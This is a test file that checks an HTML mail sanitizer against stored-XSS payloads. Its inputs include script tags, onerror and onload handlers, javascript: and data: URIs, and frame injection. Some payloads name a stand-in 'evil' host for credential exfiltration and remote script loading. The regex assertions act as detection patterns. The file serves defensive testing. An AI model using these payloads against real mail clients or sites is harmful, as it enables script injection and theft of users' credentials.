import { describe, expect, it } from 'vitest'
import { sanitizeHtml } from './sanitize'

/**
 * WS5.2 stored-XSS gate (LAUNCH:187 — "HTML mail sanitizer verified with a
 * stored-XSS payload"). A malicious sender writes a payload to OUR mailbox via
 * the SMTP/IMAP bridge (that's the "stored" part — it lives in the mailbox and
 * is later rendered by any reader); the sanitizer must make every executable
 * vector INERT before the Reader seam renders it.
 *
 * "Inert" means: after sanitizeHtml, no <script>, no event-handler attribute,
 * no javascript:/data: URI, no iframe/object/svg/frame that could host or
 * smuggle code — and any residual text-only content survives (that's why HTML
 * mail is worth rendering at all).
 */
describe('sanitizeHtml inert-gate (stored-XSS payloads)', () => {
  const storedXssPayloads: string[] = [
    // classic <script> drop
    '<script>window.__pwned = 1</script><p>hi</p>',
    // event-handler on a safe-looking tag
    '<img src=x onerror="alert(1)" />',
    // javascript: in a clickable href (the #1 mail vector)
    '<a href="javascript:alert(document.domain)">click</a>',
    // data: URI smuggle
    '<a href="data:text/html;base64,PHNjcmlwdD4=</a>',
    // <svg> foreignObject / onload survivor used by mail clients
    '<svg><g onload="alert(2)"></g></svg>',
    // <iframe> / <object> / <embed> frame injection
    '<iframe src="https://evil/x"></iframe><object data="x"></object><embed src="x">',
    // style-based vector (still the old-school bgurl onclick)
    '<div style="background:url(javascript:alert(3))">x</div>',
    // form with action-exfil
    '<form action="https://evil/exfil"><input name="creds" />',
    // self-closing script + noscript double
    '<script src="//evil/0.js"/><noscript><p title="</noscript><img src=x onerror=alert(4)>">',
  ]

  it('strips every executable vector from stored payloads, keeps text', () => {
    for (const payload of storedXssPayloads) {
      const out = sanitizeHtml(payload)
      expect(out).not.toMatch(/<script[^>]*>/i)
      expect(out).not.toMatch(/<iframe/i)
      expect(out).not.toMatch(/<object/i)
      expect(out).not.toMatch(/<embed/i)
      expect(out).not.toMatch(/<svg/i)
      expect(out).not.toMatch(/on\w+\s*=/i)
      expect(out).not.toMatch(/javascript:/i)
      expect(out).not.toMatch(/data:text\/html/i)
      expect(out).not.toMatch(/background:\s*url/i)
      // text survival is NOT promised here: several vectors carry their
      // marker inside a WHOLE-stripped node (form/svg/iframe/script), so
      // demanding that text back would be a false PASS — the node-strip IS
      // the WS5.2 gate. Residual-text preservation for legit mail is gated
      // by the dedicated "normal HTML body" test below (4 survivors).
    }
  })

  it('renders a normal HTML body inert but useful', () => {
    const body =
      '<div style="color:#333"><p>Morning <strong>Alex</strong> —<br/>quota is at 62%.</p><p>Reply when you can.</p><ul><li>one</li><li>two</li></ul></div>'
    const out = sanitizeHtml(body)
    expect(out).toContain('Morning')
    expect(out).toContain('62%')
    expect(out).toContain('Reply when you can')
    expect(out).toContain('<p>')
    expect(out).toContain('<strong>')
    expect(out).toContain('<ul>')
    expect(out).toContain('<li>')
  })
})
